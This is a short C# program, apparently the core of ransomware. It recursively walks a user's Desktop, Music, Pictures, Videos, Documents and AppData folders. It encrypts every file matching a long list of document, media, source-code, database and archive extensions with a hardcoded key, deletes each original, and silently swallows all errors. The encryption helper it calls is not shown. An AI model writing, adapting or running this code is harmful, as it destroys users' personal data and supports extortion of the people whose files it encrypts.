using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace FileEncrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> pathsToEncrypt = new List<string>();
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (string currentPath in pathsToEncrypt)
            {
                GetFilesAndEncrypt(currentPath);
            }
        }
        static void GetFilesAndEncrypt(string Ps)
        {
            try
            {
                var validExtensions = new[]
                {
                    ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf",
                    ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".rar", ".zip", ".7zip", ".7z", ".dat", ".csv",
                    ".efx", ".sdf", ".vcf", ".xml", ".ses", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt",
                    ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx",
                    ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb",
                    ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm",".wav",
                    ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv",
                    ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".m4a", ".ico", ".dic", ".rex", ".hmg", ".config", ".resx", ".res", ".bat", ".vbs", ".dll", ".iso"
                };
                string[] files = Directory.GetFiles(Ps);
                foreach (string currentFile in files)
                {
                    string extension = Path.GetExtension(currentFile);
                    if (validExtensions.Contains(extension))
                    {
                        Utils.FileEncrypt(currentFile, "k9I3vNp87xFJ6f1IlaX5");
                        File.Delete(currentFile);
                    }
                }
                string[] subDirs = Directory.GetDirectories(Ps);
                foreach (string currentPath in subDirs)
                {
                    GetFilesAndEncrypt(currentPath);
                }
            }
            catch { }
        }
    }
}
